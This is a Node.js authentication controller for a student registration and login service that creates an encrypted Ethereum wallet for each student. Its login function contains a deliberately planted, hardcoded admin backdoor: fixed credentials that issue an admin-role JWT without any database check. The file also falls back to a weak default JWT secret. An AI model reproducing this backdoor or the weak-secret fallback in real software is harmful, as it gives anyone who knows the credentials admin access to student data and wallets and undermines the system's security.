const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const dbPool = require('../db');
const { createEncryptedWallet } = require('../walletService');

const JWT_SECRET = process.env.JWT_SECRET || 'change_this_secret';
const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '7d';

// Helper: sign JWT
function signToken(payload) {
  return jwt.sign(payload, JWT_SECRET, { expiresIn: JWT_EXPIRES_IN });
}

// POST /api/auth/register
// Body: { email, password, full_name, student_id_number, course_name, year }
async function register(req, res) {
  try {
    const {
      email,
      password,
      full_name,
      student_id_number,
      course_name,
      year,
    } = req.body;

    if (!email || !password || !full_name || !student_id_number || !course_name || !year) {
      return res.status(400).json({
        error: 'email, password, full_name, student_id_number, course_name, and year are required.',
      });
    }

    // Check if user already exists
    const existing = await dbPool.query('SELECT id FROM students WHERE email = $1 LIMIT 1', [email]);
    if (existing.rows.length > 0) {
      return res.status(409).json({ error: 'Email already registered.' });
    }

    // Generate a new wallet first so we have an address for ethereum_address
    const { address, encryptedJson } = await createEncryptedWallet(password);

    const hashedPassword = await bcrypt.hash(password, 10);

    // Use a transaction so student and wallet are created together
    const client = await dbPool.connect();
    let user;
    try {
      await client.query('BEGIN');

      const insertUser = await client.query(
        `INSERT INTO students (email, password, full_name, student_id_number, course_name, year, ethereum_address)
         VALUES ($1, $2, $3, $4, $5, $6, $7)
         RETURNING id, email, full_name`,
        [email, hashedPassword, full_name, student_id_number, course_name, year, address]
      );

      user = insertUser.rows[0];

      await client.query(
        `INSERT INTO wallets (user_id, public_address, encrypted_json)
         VALUES ($1, $2, $3)
         ON CONFLICT (user_id)
         DO NOTHING`,
        [user.id, address, encryptedJson]
      );

      await client.query('COMMIT');
    } catch (txErr) {
      await client.query('ROLLBACK');
      console.error('Register transaction error:', txErr);
      return res.status(500).json({ error: 'Registration failed during wallet creation.' });
    } finally {
      client.release();
    }

    const token = signToken({ id: user.id, email: user.email });

    res.status(201).json({
      message: 'Registered successfully.',
      token,
      user,
    });
  } catch (error) {
    console.error('Register error:', error);
    res.status(500).json({ error: 'Registration failed.' });
  }
}

// POST /api/auth/login
// Body: { email, password }
async function login(req, res) {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'email and password are required.' });
    }

    // --- HARDCODED ADMIN BACKDOOR ---
    if (email === 'admin@example.com' && password === 'admin123') {
       const adminToken = signToken({ id: 99999, email: 'admin@example.com', role: 'admin' });
       return res.json({
         message: 'Admin Login successful.',
         token: adminToken,
         user: {
           id: 99999,
           email: 'admin@example.com',
           full_name: 'Sys Admin'
         }
       });
    }
    // --------------------------------

    const result = await dbPool.query(
      'SELECT id, email, full_name, password FROM students WHERE email = $1 LIMIT 1',
      [email]
    );

    if (result.rows.length === 0) {
      return res.status(401).json({ error: 'Invalid credentials.' });
    }

    const user = result.rows[0];
    const isMatch = await bcrypt.compare(password, user.password);

    if (!isMatch) {
      return res.status(401).json({ error: 'Invalid credentials.' });
    }

    const token = signToken({ id: user.id, email: user.email });

    res.json({
      message: 'Login successful.',
      token,
      user: {
        id: user.id,
        email: user.email,
        full_name: user.full_name,
      },
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed.' });
  }
}

module.exports = {
  register,
  login,
};


